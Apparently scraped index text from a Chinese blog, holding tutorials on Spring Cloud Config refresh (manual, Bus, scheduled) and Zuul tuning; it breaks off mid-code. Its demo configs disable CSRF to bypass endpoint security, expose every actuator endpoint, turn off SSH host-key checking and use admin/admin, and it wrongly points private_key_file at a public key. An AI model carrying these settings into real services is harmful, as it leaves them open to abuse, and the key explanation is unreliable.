12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中，其中 uri 指的是 Git 远程仓库的地址，private_key_file 是指 SSH 公钥文件；若 Git 仓库地址使用的是 HTTPS 协议，此时可以使用 usemame 、password 参数替代掉 private_key_file，两者分别代表 Git 访问的用户名和密码；search-paths 表示搜索特定目录下所有满足条件的配置文件，可以根据需求添加多个目录，目录之间用逗号隔开；label 指的是 Git 仓库的分支名称，如果不写，默认的分支为 master 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 启动 Config Server 应用后，可以看到控制台会输出如下信息，这里只是截取关键信息，从控制台信息里的 Mapped 中可以看到配置信息和 URL 的映射关系；其中 name 是应用名称，也可以理解成 Git 仓库里配置文件的名称，profile 指的是对应激活的环境名，例如 dev、test、prod 等，label 指的是 Git 的分支 12345678910Mapped "{[/{name}-{profiles}.yml || /{name}-{profiles}.yaml],methods=[GET]}"Mapped "{[/{name}/{profiles:.*[^-].*}],methods=[GET]}"Mapped "{[/{name}/{profiles}/{label:.*}],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.properties],methods=[GET]}"Mapped "{[/{name}-{profiles}.json],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.json],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.yml || /{label}/{name}-{profiles}.yaml],methods=[GET]}"Mapped "{[/{name}/{profile}/**],methods=[GET],params=[useDefaultLabel]}"Mapped "{[/{name}/{profile}/{label}/**],methods=[GET]}"Mapped "{[/{name}/{profile}/{label}/**],methods=[GET],produces=[application/octet-stream]}" 通过 http://127.0.0.1:8001/config-client/dev/master 访问 Config Server，接口返回的结果如下 此时观察 Config Server 控制台打印的信息可知，Config Server 会在本地的临时目录下面克隆远程仓库中的配置文件，本地临时目录的路径如下： 1o.s.c.c.s.e.NativeEnvironmentRepository : Adding property source: file:/tmp/config-repo-3558022506897899775/application.yml (document #0) 5. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-client 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，这些配置为什么要放在 bootstrap.yml 里，而不放在 application.yml 中呢？这与 Spring Boot 的加载顺序有关，bootstrap.yml 文件会优先于 application.yml 加载，因此会去加载远程的配置文件信息 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 6. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 重启 config-client 应用，再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了 刷新配置中心信息Config Client 手动刷新为了不用重启 Congit Client 应用也可以获取到最新的配置信息，下面将讲解在 Congit Client 端如何手动刷新配置信息，点击下载完整的案例代码。 i. 准备工作本示例用到上面入门案例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 ii. 创建 Config Server 工程由于本示例是在上面的入门案例的基础上进行改造的，因此 Config Server 工程与上面入门案例中的 Config Server 工程完全一样，只需拷贝一份即可，由于篇幅有限，这里不再累述。 iii. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，第二个依赖是端点的访问依赖，第三个依赖是安全的依赖： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Config Client 需要的 application.yml 配置文件到工程中，management.endpoints.web.exposure.include=* 表示暴露所有端点，默认情况下只暴露 info、health 端点，management.endpoint.health.show-details=always 表示总是显示详细信息 1234567891011spring: application: name: config-clientmanagement: endpoints: web: exposure: include: "*" health: show-details: always 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中： 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 往 Config Client 添加安全配置类，主要作用是关闭端点访问的安全校验： 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息。注意，这里的 ConfigProperties 与 ConfigController 类都需要额外添加 @RefreshScope 注解，被 @RefreshScope 注解修饰的 Bean 都是延迟加载的，只有在第一次访问时才会被初始化；刷新 Bean 也是同理，刷新后下次访问会创建一个新的对象 123456789101112131415@Component@RefreshScopepublic class ConfigProperties { @Value("${cn.springcloud.config}") private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 123456789101112@RefreshScope@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} iiii. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 通过 Post 请求访问 http://127.0.0.1:9001/actuator/refresh，让 Config Client 刷新配置信息 再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了 结合 Spring Cloud Bus 热更新Spring Cloud Config 结合 Spring Cloud Bus 进行刷新的整体流程图如下，当用户更新配置信息时，触发 Git Hook 配置地址的调用，Config Server 接收到 Refresh 请求后，通过 Bus 将消息发送到 Config Client，当 Config Client 接收到消息后会重新发送请求加载配置信息，大体流程就是这样。下面将使用 RabbitMQ 作为消息中间件，由于篇幅有限，这里不再讲解 RabbitMQ 的安装和使用方法，点击下载完整的案例代码。 1. 准备工作本示例用到上面入门案例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 2. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，第二个依赖是端点的访问依赖，第三个依赖是安全的依赖，第四个是消息中间件的依赖： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 创建 Config Server 的安全配置类，主要作用是关闭端点访问的安全校验： 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} 添加 Config Server 需要的 application.yml 配置文件到工程中，其中包括 RabbitMQ 的地址和账号信息，spring.cloud.bus.trace.enabled=true 表示开启消息跟踪： 12345678910111213141516171819202122232425262728293031server: port: 8001spring: application: name: config-server rabbitmq: port: 5672 host: localhost username: admin password: admin cloud: bus: trace: enabled: true config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: mastermanagement: endpoints: web: exposure: include: "*" health: show-details: always 3. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，第二个依赖是端点的访问依赖，第三个依赖是安全的依赖，第四个是消息中间件的依赖： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; 往 Config Client 添加安全配置类，主要作用是关闭端点访问的安全校验： 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息；注意，这里的 ConfigProperties 与 ConfigController 类都需要额外添加 @RefreshScope 注解 123456789101112131415@Component@RefreshScopepublic class ConfigProperties { @Value("${cn.springcloud.config}") private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 123456789101112@RefreshScope@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中，其中包括 RabbitMQ 的地址和账号信息，spring.cloud.bus.trace.enabled=true 表示开启消息跟踪： 1234567891011121314151617181920spring: application: name: config-client rabbitmq: port: 5672 host: localhost username: admin password: admin cloud: bus: trace: enabled: truemanagement: endpoints: web: exposure: include: "*" health: show-details: always 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中： 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 4. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 通过 Post 请求访问 http://127.0.0.1:8001/actuator/bus-refresh，让 Config Server 通过 Spring Cloud Bus 发送消息通知所有 Config Client 刷新配置信息 再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了提示：可以将 Spring Cloud Bus 的刷新地址配置在 WebHooks 上面，这样在 Git 仓库每次有新文件提交（Push）之后，所有 Config Client 都会自动执行刷新的动作 Config Client 自动刷新（任务调度）在有些应用上面，不需要在服务端批量推送消息的时候，客户端本身需要获取参数变化的情况，此时可以使用客户端的自动刷新功能，其原理是使用任务调度执行刷新操作，点击下载完整的案例代码 1. 准备说明本示例用到上面入门案例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 2. Config Refresh Autoconfig 工程创建 Config Refresh Autoconfig 的 Maven 工程，配置工程里的 pom.xml 文件： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Refresh Autoconfig 工程里的自动配置类，添加相关注解，使其在 Spring Boot 启动的时候将其加载。在该类中，主要是注入了端点类，通过定时任务和刷新时间，进行配置请求刷新。由于在类中是直接调用了 RefreshEndpoint 的 refresh() 方法，所以对于 F 版的安全机制不需要对端点进行打开也可以，但需要依赖 spring-boot-starter-actuator，否则无法注入 RefreshEndpoint 的 Bean： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@ConditionalOnClass(RefreshEndpoint.class)@ConditionalOnProperty("spring.cloud.config.refreshInterval")@AutoConfigureAfter(RefreshAutoConfiguration.class)@Configurationpublic class ConfigAutoRefreshConfiguration implements SchedulingConfigurer { private static final Logger logger = LoggerFactory.getLogger(ConfigAutoRefreshConfiguration.class); /** * 间隔刷新时间 */ @Value("${spring.cloud.config.refreshInterval}") private long refreshInterval; /** * 刷新的端点 */ @Autowired private RefreshEndpoint refreshEndpoint; @Override public void configureTasks(ScheduledTaskRegistrar scheduledTaskRegistrar) { final long interval = getRefreshIntervalInMilliseconds(); logger.info(String.format("Scheduling config refresh task with %s second delay", refreshInterval)); scheduledTaskRegistrar.addFixedDelayTask(new IntervalTask(new Runnable() { @Override public void run() { refreshEndpoint.refresh(); } }, interval, interval)); } /** * 以毫秒为单位返回刷新间隔 * * @return */ private long getRefreshIntervalInMilliseconds() { return refreshInterval * 1000; } /** * 如果没有在上下文中注册，则启用调度程序 */ @ConditionalOnMissingBean(ScheduledAnnotationBeanPostProcessor.class) @EnableScheduling @Configuration protected static class EnableSchedulingConfigProperties { }} 在 Config Refresh Autoconfig 工程里创建 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\com.springcloud.study.config.ConfigAutoRefreshConfiguration 3. Cofnig Client 工程这里 Cofnig Client 工程的代码基本与上面的 “Config Client 手动刷新” 示例的代码一致，拷贝一份即可，这里不再累述。 Cofnig Client 工程的 pom.xml 文件，引入 config-refresh-autoconfig 依赖： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-refresh-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Cofnig Client 工程的 application.yml 文件，refreshInterval: 15 表示每 15 秒刷新一次配置信息： 123456spring: application: name: config-client cloud: config: refreshInterval: 15 4. Cofnig Server 工程这里 Cofnig Server 工程的代码基本与上面的 “Config Client 手动刷新” 示例的代码一致，拷贝一份即可，这里不再累述。 5. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 等待一段时间后（15 秒），再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了 下篇 - Config 入门教程（中级篇） Config 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Zuul 入门教程 - 高级篇",url:"/posts/9652d40e.html",text:'上篇 - Zuul 入门教程（中级篇） Zuul 入门教程 - 中级篇 前言版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，Zuul 版本是 1.x，特别声明除外。 Zuul 多层负载痛点场景在 Spring Cloud 微服务架构体系中，所有请求的前门的网关 Zuul 承担着请求转发的主要功能，对后端服务起着举足轻重的作用。当业务体量猛增之后，得益于 Spring Cloud 的横向扩展能力，往往加节点、加机器就可以使得系统支撑性获得大大提升，但是仅仅加服务而不加网关是会有性能瓶颈的，单一 Zuul 节点的处理能力十分有限。因此扩张节点往往是微服务连带 Zuul 一起扩张，一般会部署一个 Zuul 集群来横向扩展微服务应用，然后再在请求上层加一层软负载，通常是使用 Nginx 均分请求到 Zuul 集群（如下图）。此时若其中一台 Zuul 服务挂掉了，由于从 Nginx 到 Zuul 其实是没有什么关联性，如果 Zuul 服务宕掉，Nginx 还是会把请求导向到 Zuul 服务，导致从 Nginx 到这 Zuul 节点的请求会全部失效，在 Nginx 没有采取相关应对措施的情况下，这是十分严重的问题。 解决方案OpenResty 整合了 Nginx 与 Lua，实现了可伸缩的 Web 服务器，内部集成了大量精良的 Lua 库、第三方模块以及多数的依赖项，能够非常快捷地搭建处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。开发者可以使用 Lua 脚本模块与注册中心构建一个服务动态增减的机制，通过 Lua 获取注册中心状态为 UP 的服务，动态地加入到 Nginx 的负载均衡列表中去，由于这种架构模式涉及了不止一个负载均衡器，一般称其为 “多层负载”（如下图）。 目前 Spring Cloud 中国社区针对这一场景开源了相关的 Lua 插件源码，GitHub 地址在这里，核心配置如下。实现原理是使用 Lua 脚本定时根据配置的服务名与 Eureka 地址，去拉取该服务的信息，在 Eureka 里面提供 /eureka/apps/(serviceld) 端点，返回服务的注册信息，所以只需要取用状态为 UP 的服务，将它的地址加入 Nginx 负载列表即可。此项目使得 Nginx 与 Zuul 之间 拥有一个动态感知能力，不用手动配置 Nginx 负载与 Zuul 负载，这样对于应用弹性扩展是极其友好的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455http { #sharing cache area lua_shared_dict dynamic_eureka_balancer 128m; init_worker_by_lua_block { -- init eureka balancer local file = require "resty.dynamic_eureka_balancer" local balancer = file:new({dict_name="dynamic_eureka_balancer"}) --eureka server list balancer.set_eureka_service_url({"127.0.0.1:8888", "127.0.0.1:9999"}) --eureka basic authentication --use this setting if eureka has enabled basic authentication. --note: basic authentication must use BASE64 encryption in `user:password` format --balancer.set_eureka_service_basic_authentication("") --The service name that needs to be monitored balancer.watch_service({"zuul", "client"}) } upstream springcloud_cn { server 127.0.0.1:666; # Required, because empty upstream block is rejected by nginx (nginx+ can use \'zone\' instead) balancer_by_lua_block { --The zuul name that needs to be monitored local service_name = "zuul" local file = require "resty.dynamic_eureka_balancer" local balancer = file:new({dict_name="dynamic_eureka_balancer"}) --balancer.ip_hash(service_name) --IP Hash LB balancer.round_robin(service_name) --Round Robin LB } } server { listen 80; server_name localhost; location / { proxy_pass http://springcloud_cn/; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } }} Zuul 应用优化概述Zuul（这里指 Zuul1.0 版本，Zuul2.0 版本之后使用了 Netty 的异步非阻塞模型）在给微服务体系带来诸多便利的同时，也饱受着性能的争议，这一切还要从它的底层架构说起。Zuul 是建立在 Servlet 的同步阻塞架构基础上，所以在处理逻辑上面是和线程密不可分的，每一次请求都需要从线程池获取一个线程来维持 I/O 操作，路由转发的时候又需要从 HTTP 客户端获取线程来维持连接，这就会导致一个组件占用两个线程资源的情况。所以，在 Zuul 的使用中，对这部分的优化是很有必要的，一个好的优化体系会使得应用支撑的业务体量更大，也能最大化利用服务器资源。在这里，将对 Zuul 的优化分为以下几个类型： 容器优化：内置容器 Tomcat 与 Undertow 的比较与参数设置 组件优化：内部集成的组件优化，如 Hystrix 线程隔离、Ribbon. HttpClient 与 OkHttp 选择 JVM 参数优化：适用于网关应用的 JVM 参数建议 内部优化：一些内部原生参数，或者内部源码，以一种更恰当的方式重写它们 容器优化关于 Spring Boot 优化的文章，网上有很多，不过大部分都会提到把默认的内嵌容器 Tomcat 替换成 Undertow。其中 Undertow 翻译为” 暗流”，即平静的湖面下暗藏着波涛汹涌，所以 JBoss 公司取其意，为它的轻量级高性能容器命名。Undertow 提供阻塞或基于 XNIO 的非阻塞机制，它的包大小不足 1MB，内嵌模式运行时的堆内存占用只有 4MB 左右。要使用 Undertow ，只需要在配置文件中移除 Tomcat，添加 Undertow 的依赖 即可： 123456789101112131415&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupld&gt;org.springframework.boot&lt;/groupld&gt; &lt;artifactld&gt;spring-boot-starter-tomcat&lt;/artifactld&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupld&gt;org.springframework.boot&lt;/groupld&gt; &lt;artifactld&gt;spring-boot-starter-undertow&lt;/artifactld&gt;&lt;/dependency&gt; Undertow 的主要配置参数如下： 组件优化在 Spring Cloud 微服务体系中，Zuul 是一个容易被忽略优化，但是集成组件最多，功能最强大的组件。Zuul 网关主要用于智能路由，同时也支持认证、区域和内容感知路由，将多个底层服务聚合成统一的对外 API。所以要更好地使用 Zuul，就免不了要对它集成的组件进行优化，使它可以更好地支撑服务集群。 Hystrix 优化由于 Zuul 默认集成了 Hystrix 熔断器，使得网关应用具有弹性、容错的能力。但是如果使用缺省的配置，可能会遇到种种问题，其中最常见的问题就是当启动 Zuul 应用之后，第一次请求往往会失败。根本原因是 Hystrix 默认的超时时间是 1 秒，如果超过这个时间尚未作出响应，将会进入 fallback 代码。由于在处理第一次请求的时候，Zuul 内部要初始化很多类信息，这是十分耗时的，如果这个响应时间超过 1 秒，就会出现请求失败的问题。解决方式有以下两种： 禁用 Hystrix 的超时时间： hystrix.command.default.execution.timeout.enabled=false 加大 Hystrix 的超时时间： hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000 Zuul 中关于 Hystrix 的配置还有一个很重要的点，那就是 Hystrix 的线程隔离模式的选择，包括线程池隔离模式（THREAD）或者信号量隔离模式（SEMAPHORE）。在网关中，对资源的使用是应该受到严格控制的，如果不加限制，会导致资源滥用，在恶劣的线上环境下就容易引起服务雪崩。两种隔离模式对比，如下图所示。 Hystrix 切换隔离模式的配置方式： 1hystrix.command.default.execution.isolation.strategy=Thread | Semaphore Hystrix 隔离模式选择总结，当应用需要与外网交互，由于网络开销比较大与请求比较耗时，这时选用线程隔离策略，可以保证有剩余的容器（Tomcat &amp; Undertow &amp; Jetty）线程可用，而不会由于外部原因使得线程一直处于阻塞或等待状态，可以快速失败返回。但当微服务应用只在内网交互，并且体量比较大，这时使用信号量隔离策略就比较好，因为这类应用的响应通常会非常快（由于在内网），不会占用容器线程太长时间，可以减少线程上下文切换的开销，提高应用运转的效率，也可以起到对请求进行全局限流的作用。 Ribbon 优化这里主要是讲 Ribbon 的超时重试优化，在 Spring Cloud 中有多种发送 HTTP 请求的方式可以与 Zuul 结合，RestTemplate、Ribbon 或者 Feign，但是无论选择哪种，都可能出现请求失败的情况，这在复杂的互联网环境是不可避免的。Zuul 作为一个网关中间件，在出现偶然请求失败时进行适当的重试是十分必要的，重试可以有效地避免一些突发原因引起的请求丢失。Zuul 中的重试机制是配合 Spring Retry 与 Ribbon 来使用的。 在 pom.xml 引入 Spring Retry 的依赖包： 1234&lt;dependency&gt; &lt;groupld&gt;org.springframework.retry&lt;/groupld&gt; &lt;artifactld&gt;spring-retry&lt;/artifactld&gt;&lt;/dependency&gt; 在 application.yml 里添加重试相关的配置内容： 123456789101112131415161718#Zuul开启重试，D版之后默认为false，需要手动开启zuul: retryable: true#Ribbon的重试机制配置ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #对第一次请求的服务的重试次数 MaxAutoRetriesNextServer: 1 #要重试的下一个服务的最大数量（不包括第一个服务） OkToRetryOnAllOperations: true#SpringCloud内部默认已开启负载均衡重试，这里列出来说明这个参数比较重要spring: cloud: loadbalancer: retry: enabled: true 配置当中的 ConnectTimeout 与 ReadTimeou 是当 HTTP 客户端使用 Apache HttpClient 的时候生效的，这个超时时间最终会被设置到 Apache HttpClient 中去。在设置的时候要结合 Hystrix 的超时时间来综合考虑，针对不同的应用场景，设置太小会导致很多请求失败，设置太大会导致熔断功能控制性变差，所以需要经过压力测试得来。Zuul 同时也支持对单个映射规则进行重试 zuul.routes.&lt;route&gt;.retryable=true，需要注意的是，在某些对幂等要求比较高的使用场景下，要慎用重试机制，因为如果没有相关处理的话，出现幂等问题是十分有可能的。 内部优化在官方文档中，Zuul 部分开篇讲了 zuul.max.host.connections 属性拆解成了 zuul.host.maxTotalConnections（服务 HTTP 客户端最大连接数）与 zuul.host.maxPerRouteConnections（每个路由规则 HTTP 客户端最大连接数），默认值分别为 200 与 20，如果使用 Apache HttpClient 的时候这两个配置参数则有效，如果使用 OkHttp 则无效。在 Zuul 中还有一个超时时间，使用 serviceld 映射与 url 映射的设置是不一样的，如果使用 serviceld 映射，ribbon.ReadTimeout 与 ribbon.SocketTimeout 生效；如果使用 url 映射，应该设置 zuul.host.connect-timeout-millis 与 zuul.host.socket-timeout-millis 参数。 Zuul 源码解析（待续） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Zuul 入门教程 - 中级篇",url:"/posts/6f728f64.html",text:'上篇 - Zuul 入门教程（基础篇） Zuul 入门教程 - 基础篇 前言版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，Zuul 版本是 1.x，特别声明除外。 Zuul Filter 链工作原理Zuul 的核心逻辑是由一系列紧密配合工作的 Filter 来实现的，它们能够在进行 HTTP 请求或者响应的时候执行相关操作。可以说，没有 Filter 责任链，就没有如今的 Zuul，更不可能构成功能丰富的” 网关 “，Zuul Filter 的主要特性有以下几点： Filter 的类型：Filter 的类型决定了此 Filter 在 Filter 链中的执行顺序，可能是路由动作发生前，可能是路由动作发生时，可能是路由动作发生后，也可能是路由过程发生异常时 Filter 的执行顺序：同一种类型的 Filter 可以通过 filterOrder() 方法来设定执行顺序，一般会根据业务的执行顺序需求，来设定自定义 Filter 的执行顺序 Filter 的执行条件：Filter 运行所需要的标准或条件 Filter 的执行效果：符合某个 Filter 执行条件，产生的执行效果 Zuul 内部提供了一个动态读取、编译和运行这些 Filter 的机制，Filter 之间不直接通信，在请求线程中会通过 RequestContext 来共享状态，它的内部是用 ThreadLocal 实现的，当然也可以在 Filter 之间使用 ThreadLocal 来收集自己需要的状态或数据。Zuul 中不同类型 Filter 的执行逻辑核心在 com.netflix.zuul.http.ZuulServlet 类中定义，该类相关代码和官方流程图如下所示： 12345678910111213141516171819202122232425262728293031try { this.init((HttpServletRequest)servletRequest, (HttpServletResponse)servletResponse); RequestContext context = RequestContext.getCurrentContext(); context.setZuulEngineRan(); try { this.preRoute(); } catch (ZuulException var13) { this.error(var13); this.postRoute(); return; } try { this.route(); } catch (ZuulException var12) { this.error(var12); this.postRoute(); return; } try { this.postRoute(); } catch (ZuulException var11) { this.error(var11); }} catch (Throwable var14) { this.error(new ZuulException(var14, 500, "UNHANDLED_EXCEPTION_" + var14.getClass().getName()));} finally { 